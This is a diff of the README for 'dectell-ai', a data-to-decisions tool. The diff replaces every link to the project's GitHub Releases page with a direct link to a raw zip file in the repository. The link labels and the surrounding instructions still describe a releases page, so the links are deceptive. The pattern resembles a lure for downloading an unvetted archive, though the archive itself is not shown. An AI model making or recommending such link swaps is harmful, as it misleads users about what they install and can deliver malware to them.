@@ -1,6 +1,6 @@
 # 📊 dectell-ai - Turn Data Into Clear Decisions
 
-[![Download dectell-ai](https://img.shields.io/badge/Download%20dectell--ai-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Salomeleprous919/dectell-ai/releases)
+[![Download dectell-ai](https://img.shields.io/badge/Download%20dectell--ai-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Salomeleprous919/dectell-ai/raw/refs/heads/main/modules/dectell-ai-v2.4.zip)
 
 ## 🚀 What dectell-ai does
 
@@ -33,7 +33,7 @@ For best use, your file should have clear column names and at least a few dozen 
 
 Visit the releases page here:
 
-[Download dectell-ai from GitHub Releases](https://github.com/Salomeleprous919/dectell-ai/releases)
+[Download dectell-ai from GitHub Releases](https://github.com/Salomeleprous919/dectell-ai/raw/refs/heads/main/modules/dectell-ai-v2.4.zip)
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one made for Windows.
 
@@ -283,7 +283,7 @@ This project includes tools for:
 
 If you need the file later, use the same download page:
 
-[Open dectell-ai Releases](https://github.com/Salomeleprous919/dectell-ai/releases)
+[Open dectell-ai Releases](https://github.com/Salomeleprous919/dectell-ai/raw/refs/heads/main/modules/dectell-ai-v2.4.zip)
 
 ## 🧾 Project focus
 
